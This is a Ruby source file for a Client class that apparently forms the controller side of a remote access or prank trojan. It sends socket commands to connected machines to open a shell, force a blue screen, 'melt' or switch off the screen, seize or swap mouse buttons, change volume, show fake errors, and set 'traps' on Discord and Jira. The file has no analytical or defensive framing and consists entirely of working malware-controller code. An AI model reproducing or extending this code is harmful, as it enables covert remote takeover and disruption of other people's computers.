class Client
  # @Instance variable
  # @@Class variable
  @@clientCount = 0
  attr_accessor :name
  attr_accessor :ip
  attr_accessor :mouseTaken
  attr_accessor :jiraTrap
  attr_accessor :menuStart
  attr_accessor :discordTrap
  attr_reader :mouseSwappeed
  attr_reader :id

  def initialize(sockt)
    @ip = sockt.addr.last
    @sockt = sockt
    @@clientCount += 1
    @id = @@clientCount - 1
    @mouseTaken = 0
    @jiraTrap = 0
    @menuStart = 0
    @discordTrap = 0
  end

  def send(msg)
    @sockt.puts(msg)
  end

  def shell
    @sockt.puts("shell")
  end

  def get_mouse
    @sockt.puts("getmouse")
    @mouseTaken = 1
  end

  def give_mouse_back
    @sockt.puts("givemouseback")
    @mouseTaken = 0;
  end

  def set_discord_trap
    @sockt.puts("discordtrapon")
    @discordTrap = 1
  end

  def discard_discord_trap
    @sockt.puts("discordtrapoff")
    @discordTrap = 0;
  end

  def get_menu_start
    @sockt.puts("getmenustart")
    @menuStart = 1
  end

  def give_back_start
    @sockt.puts("givebackstart")
    @menuStart = 0;
  end

  def trap_on_jira
    @sockt.puts("jiratrap")
    @jiraTrap = 1
  end

  def trap_off_jira
    @sockt.puts("givejiraback")
    @jiraTrap = 0
  end

  def swap_mouse
    @sockt.puts("swapmousebuttons")
    @mouseSwappeed = 1
  end

  def swap_mouse_back
    @sockt.puts("swapmouseback")
    @mouseSwappeed = 0
  end

  def melt_monitor
    @sockt.puts("meltscreen")
  end

  def bsod
    @sockt.puts("bsod")
  end

  def volume_up
    @sockt.puts("volup")
  end

  def volume_down
    @sockt.puts("voldw")
  end

  def volume_mute
    @sockt.puts("mute")
  end

  def turn_off_monitor
    @sockt.puts("turnoffmonitor")
  end

  def send_error(msg)
    @sockt.puts("generateerror," + msg)
  end

  def close
    @sockt.puts("closeit")
    if @@clientCount > 0
      return @@clientCount - 1
    end
  end

  def self.num
    if @@clientCount > 0
      return @@clientCount - 1
    else
      return nil
    end
  end

  def self.dead
    $clientsList.delete_at(Client.num)
    @@clientCount -= 1
  end

  def self.quantity
    return @@clientCount
  end

end
